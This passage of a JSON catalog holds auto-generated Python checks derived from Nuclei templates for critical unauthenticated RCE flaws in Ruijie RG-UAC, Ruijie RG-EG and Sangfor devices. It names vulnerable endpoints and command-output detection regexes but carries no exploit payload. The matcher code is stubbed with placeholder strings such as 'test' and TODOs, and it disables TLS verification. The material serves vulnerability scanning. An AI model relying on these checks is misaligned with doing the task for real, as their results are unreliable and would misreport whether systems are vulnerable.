            "required": false,
            "description": "Variable Nuclei custom: match_str",
            "default": "{{md5(random_str)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ruijie-nmc-sync-rce\nName: Ruijie RG-UAC nmc_sync.php - Remote Code Execution\nSeverity: critical\nDescription: There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ruijie_nmc_sync_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ruijie-nmc-sync-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Ruijie RG-UAC nmc_sync.php - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(body_2, '{{match_str}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{match_str}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ruijie RG-UAC nmc_sync.php - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ruijie_nmc_sync_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ruijie-nmc-sync-rce\nName: Ruijie RG-UAC nmc_sync.php - Remote Code Execution\nSeverity: critical\nDescription: There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ruijie_nmc_sync_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ruijie-nmc-sync-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Ruijie RG-UAC nmc_sync.php - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(body_2, '{{match_str}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{match_str}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ruijie RG-UAC nmc_sync.php - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ruijie_nmc_sync_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rg-uac",
          "file-upload",
          "intrusive",
          "ruijie",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_ruijie_rg_eg_web_mis_rce",
        "name": "Ruijie RG-EG - Remote Code Execution",
        "language": "Python",
        "famille": "IoT",
        "description": "Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server permissions.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(body, \"ruijie\") / [OR] DSL: status_code == 200; regex(\"uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)\", body)",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ruijie-rg-eg-web-mis-rce\nName: Ruijie RG-EG - Remote Code Execution\nSeverity: critical\nDescription: Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ruijie_rg_eg_web_mis_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ruijie-rg-eg-web-mis-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Ruijie RG-EG - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"ruijie\") / [OR] DSL: status_code == 200; regex(\"uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)\", body)'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ruijie RG-EG - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ruijie_rg_eg_web_mis_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ruijie-rg-eg-web-mis-rce\nName: Ruijie RG-EG - Remote Code Execution\nSeverity: critical\nDescription: Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ruijie_rg_eg_web_mis_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ruijie-rg-eg-web-mis-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Ruijie RG-EG - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"ruijie\") / [OR] DSL: status_code == 200; regex(\"uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)\", body)'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ruijie RG-EG - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ruijie_rg_eg_web_mis_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "ruijie",
          "router",
          "iot",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sangfor_login_rce",
        "name": "Sangfor Application Login - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; regex(\"uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)\", body)",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sangfor-login-rce\nName: Sangfor Application Login - Remote Command Execution\nSeverity: critical\nDescription: Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sangfor_login_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sangfor-login-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Sangfor Application Login - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; regex(\"uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)\", body)'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Sangfor Application Login - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sangfor_login_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
